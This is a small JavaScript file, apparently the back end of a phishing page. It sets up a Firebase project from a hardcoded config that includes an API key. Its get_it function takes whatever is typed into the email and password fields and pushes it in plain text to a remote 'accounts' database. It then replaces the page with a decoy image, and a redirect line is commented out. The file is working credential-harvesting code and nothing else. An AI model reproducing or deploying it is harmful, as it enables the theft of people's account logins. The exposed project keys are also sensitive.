var firebaseConfig = {
  apiKey: "AIzaSyByHQ8OTcIWzLEtBSJc-IW33HMAcdNT3xc",
  authDomain: "idea-26ed3.firebaseapp.com",
  databaseURL: "https://idea-26ed3.firebaseio.com",
  projectId: "idea-26ed3",
  storageBucket: "",
  messagingSenderId: "577143044096",
  appId: "1:577143044096:web:412f5aa24248b5c36280e5",
  measurementId: "G-6GG64KP0NX"
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);


function removeDummy() {
  var elem = document.getElementById('hole_thing');
  elem.parentNode.removeChild(elem);
  return false;
}

function get_it()
{
	    var email=document.getElementById("email_field").value;
        var pass=document.getElementById("password_field").value;
        var database=firebase.database();
        var ref=database.ref('accounts');
        var data={
            em:email,
            pass_word:pass
        }
        ref.push(data);
        var img = document.createElement("img");
 
          img.src = "https://image.winudf.com/v2/image/Y29tLmhkd2FsbHBhcGVyLm1vbmV5aGR3YWxscGFwZXJzX3NjcmVlbl8wX3k4aHZocGFv/screen-0.jpg?fakeurl=1&type=.jpg";
          var src = document.getElementById("hhhh");
          removeDummy();
          src.appendChild(img);
       // window.location.href = "redir.html";	
}